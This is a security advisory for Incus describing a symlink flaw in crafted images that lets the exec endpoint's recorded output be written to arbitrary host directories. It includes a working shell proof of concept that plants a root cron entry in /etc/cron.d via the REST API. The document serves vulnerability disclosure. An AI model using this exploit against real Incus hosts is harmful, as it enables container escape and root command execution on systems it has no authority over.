# [C] Incus has an arbitrary file write on host via `exec-output` symlink in crafted image

## Summary
Severity: Critical
Advisory: GHSA-73hr-m85f-64v9
CVE: CVE-2026-48750
CWE: CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-73hr-m85f-64v9
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v7/cmd/incusd` — affected >=0 <7.2.0

## Details
### Summary

The `record-output` parameter of the `/instances/$name/exec` endpoint stores the output of the command in the `exec-output` directory of the instance. If `exec-output` is a symlink, file named `exec_UUID.stdout` and `exec_UUID.stderr` can be written to an arbitrary location where the `.stdout` file will contain arbitrary content. This behavior can be abused for arbitrary command execution.


### Details

When an image is unpacked, top-level symlinks are extracted as is; allowing for `exec-output` to be placed on disk. In `instance_exec.go`, `os.Mkdir` continues of `exec-output` exists and `os.OpenFile` follows the `exec-output` symlink.


### PoC

Below, we place the `exec_UUID.stdout` file in `/etc/cron.d` on
the host for arbitrary command execution.

```
#!/bin/sh
# usage: $0 existing-imagefp
set -eu

basefp="${1}"

die() {
        printf '%s' "${@}" >&2
        exit 1
}

command -v curl >/dev/null 2>&1 || die 'error: curl not found\n'
command -v python3 >/dev/null 2>&1 || die 'error: python3 not found\n'

tmpdir=$(mktemp -d)
cleanup() {
        rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP


# insert exec-output symlink

incus image export "${basefp}" "${tmpdir}/img"

mkdir "${tmpdir}/repack"
cd "${tmpdir}/repack"

xz -cd "${tmpdir}/img" | tar -f- -vx

rm -rf exec-output
ln -s /etc/cron.d exec-output

tar -f- -c * | gzip -c9 >"${tmpdir}/img"

cd - >/dev/null
incus image import "${tmpdir}"/img* --alias afw-exec-output


# Launch container, exec with record-output via REST API
incus launch afw-exec-output afw-exec-output
incus wait afw-exec-output ip

OP=$(curl -s --unix-socket /var/lib/incus/unix.socket \
  -X POST -H 'Content-Type: application/json' \
  -d '{"command":["/bin/sh","-c","echo * * * * * root id'"'>'"'/afw-exec-output"],"record-output":true}' \
  "lxd/1.0/instances/afw-exec-output/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['operation'])")

curl -s --unix-socket /var/lib/incus/unix.socket "$OP/wait?timeout=30" >/dev/null

#find /etc/cron.d/exec_* -exec cat {} \;
```

### Impact

Constrained file creation in an arbitrary directory on the host via
via an unsanitized symlink; possibly leading to command execution.

## References
- https://github.com/lxc/incus/security/advisories/GHSA-73hr-m85f-64v9
- https://github.com/lxc/incus
